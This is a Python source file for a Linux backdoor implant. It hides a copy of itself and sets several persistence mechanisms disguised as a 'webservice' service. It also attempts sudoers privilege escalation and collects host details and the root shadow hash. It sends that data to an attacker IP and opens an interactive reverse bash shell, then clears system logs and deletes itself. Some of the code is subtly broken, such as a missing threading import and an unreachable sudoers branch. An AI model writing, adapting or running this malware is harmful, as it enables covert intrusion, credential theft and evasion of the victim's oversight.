
import os
import subprocess
import socket
import psutil  # pip install psutil for process hiding
import pty
import time
import select
import uuid
import logging

# Configure logging (hidden, for debugging)
logging.basicConfig(filename='/tmp/.webservice.log', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')
logging.getLogger().handlers = []  # Disable console output

# Configuration
ATTACKER_IP = "192.168.1.100"  # Attacker's IP
PORT = 4444  # Port for reverse shell and server
HIDDEN_DIR = "/var/tmp/.webservice"  # Hidden directory
HIDDEN_FILE = f"{HIDDEN_DIR}/webservice.py"  # Hidden file
PROCESS_NAME = "[webservice]"  # Process name to mimic
LOG_FILES = ["/var/log/auth.log", "/var/log/syslog", "/var/log/utmp", "/var/log/wtmp", os.path.expanduser("~/.bash_history")]  # Logs to clean
PERSIST_METHODS = [
    f"(crontab -l 2>/dev/null | grep -v {HIDDEN_FILE}; echo \"* * * * * python3 {HIDDEN_FILE} > /dev/null 2>&1\") | crontab -",
    f"[ -f /etc/rc.local ] && echo 'python3 {HIDDEN_FILE}' >> /etc/rc.local",
    f"echo '@reboot python3 {HIDDEN_FILE}' | crontab -",
    f"mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=python3 {HIDDEN_FILE}\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
]
SUDOERS_FILE = "/etc/sudoers.d/webservice"
RETRY_INTERVALS = [1, 2, 4, 8, 16, 32, 64]  # Exponential backoff in seconds
UUID = str(uuid.uuid4())  # Generate unique client ID

# Check and elevate to root if possible
if os.geteuid() != 0:
    try:
        subprocess.run(["sudo", "-n", "python3", __file__], check=True)
        exit(0)
    except subprocess.CalledProcessError:
        is_admin = "No"
        logging.debug("Running as non-root user")
        # Add sudoers entry for root elevation on reboot
        if os.geteuid() == 0:
            with open(SUDOERS_FILE, 'w') as f:
                f.write(f"{os.getlogin()} ALL=(ALL) NOPASSWD: {HIDDEN_FILE}\n")
            os.chmod(SUDOERS_FILE, 0o440)
            os.system(f"chattr +i {SUDOERS_FILE} 2>/dev/null")
else:
    is_admin = "Yes"
    logging.debug("Running as root")

# Hide the payload
try:
    if os.path.exists(HIDDEN_DIR):
        os.system(f"chattr -i {HIDDEN_DIR} {HIDDEN_FILE} 2>/dev/null")
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    with open(__file__, 'r') as f:
        code = f.read()
    with open(HIDDEN_FILE, 'w') as f:
        f.write(code)
    os.chmod(HIDDEN_DIR, 0o700)
    os.chmod(HIDDEN_FILE, 0o700)
    os.system(f"chattr +i {HIDDEN_DIR} {HIDDEN_FILE} 2>/dev/null")
    logging.debug(f"Payload hidden in {HIDDEN_FILE}")
except PermissionError as e:
    logging.error(f"Permission denied: {e}")
    exit(1)

# Persistence (multiple methods)
for method in PERSIST_METHODS:
    os.system(method)
    logging.debug(f"Applied persistence method: {method}")

# Hide process
try:
    p = psutil.Process(os.getpid())
    p.name(PROCESS_NAME)
    logging.debug(f"Process hidden as {PROCESS_NAME}")
except Exception as e:
    logging.warning(f"Failed to hide process: {e}")

# Data Exfiltration
info = f"Hostname: {os.uname().nodename}\nOS: {os.uname().sysname} {os.uname().release}\nIP: {subprocess.getoutput('ip addr show | grep inet | awk \'{print $2}\' | paste -sd \',\'')}\nUsers: {subprocess.getoutput('cat /etc/passwd | cut -d: -f1 | paste -sd \',\'')}\nUptime: {subprocess.getoutput('uptime')}\nDisk Usage: {subprocess.getoutput('df -h | grep -v tmpfs | grep -v udev')}"

# Try root password from /etc/shadow
if is_admin == "Yes":
    shadow = subprocess.getoutput('grep "^root:" /etc/shadow 2>/dev/null || echo "Not readable"')
    info += f"\nRoot Shadow: {shadow}"
else:
    info += "\nNon-root: Shadow not readable. Other Users: " + subprocess.getoutput('grep -v root /etc/passwd | cut -d: -f1,6 | paste -sd \',\' 2>/dev/null')

# Custom command handler
def handle_custom_command(cmd):
    if cmd == "status":
        return f"Status: Active\nAdmin: {is_admin}\nPID: {os.getpid()}\nUUID: {UUID}\nUptime: {subprocess.getoutput('uptime')}"
    elif cmd == "info":
        return info
    else:
        return f"Unknown command: {cmd}"

# Heartbeat function
def send_heartbeat(s):
    while True:
        try:
            s.send(f"KEEPALIVE:{UUID}\n".encode('utf-8'))
            logging.debug(f"Sent KEEPALIVE for UUID {UUID}")
            time.sleep(5)  # More frequent heartbeat
        except Exception:
            logging.warning("Heartbeat failed")
            break

# Single connection for messages and shell
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(120)  # Increased timeout
        s.connect((ATTACKER_IP, PORT))
        logging.debug(f"Connected to {ATTACKER_IP}:{PORT}")
        # Send initial messages
        messages = [
            f"MSG:CONN:sono connesso! Admin: {is_admin} UUID: {UUID}",
            f"MSG:INFO:{info}",
            f"MSG:STATUS:Payload active, awaiting shell commands",
            f"MSG:SHELL:START"
        ]
        for msg in messages:
            s.send((msg + "\n").encode('utf-8'))
            time.sleep(0.1)
            logging.debug(f"Sent message: {msg}")
        
        # Start heartbeat in separate thread
        threading.Thread(target=send_heartbeat, args=(s,), daemon=True).start()
        
        # Start interactive shell with custom command support
        def read_from_socket(fd):
            r, _, _ = select.select([s], [], [], 0.1)
            if s in r:
                data = s.recv(4096).decode('utf-8')
                if data.startswith("KEEPALIVE:"):
                    logging.debug(f"Received KEEPALIVE: {data}")
                    return b""
                logging.debug(f"Received command: {data}")
                if data.strip() in ["status", "info"]:
                    response = handle_custom_command(data.strip())
                    s.send((response + "\n").encode('utf-8'))
                    return b""
                return data.encode('utf-8')
            return b""
        
        def write_to_socket(fd, data):
            s.send(data)
            logging.debug(f"Sent shell data: {data.decode('utf-8', errors='ignore').strip()}")
        
        pty.spawn(["/bin/bash", "-i"], read_from_socket, write_to_socket)
        s.close()
        logging.debug("Shell connection closed")
    except Exception as e:
        logging.error(f"Connection failed: {e}")
        # Exponential backoff retry
        for interval in RETRY_INTERVALS:
            time.sleep(interval)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ATTACKER_IP, PORT))
                s.close()
                logging.debug("Connection test succeeded, retrying main loop")
                break
            except Exception:
                logging.debug(f"Retry failed after {interval}s")
                continue
        else:
            continue
        break

# Clean logs to hide tracks
for log in LOG_FILES:
    if os.path.exists(log):
        try:
            open(log, 'w').close()
            logging.debug(f"Cleared log: {log}")
        except PermissionError:
            logging.warning(f"Failed to clear log {log}: Permission denied")

# Self-delete to make removal harder
try:
    os.remove(__file__)
    logging.debug("Self-deleted payload")
except Exception as e:
    logging.warning(f"Failed to self-delete: {e}")
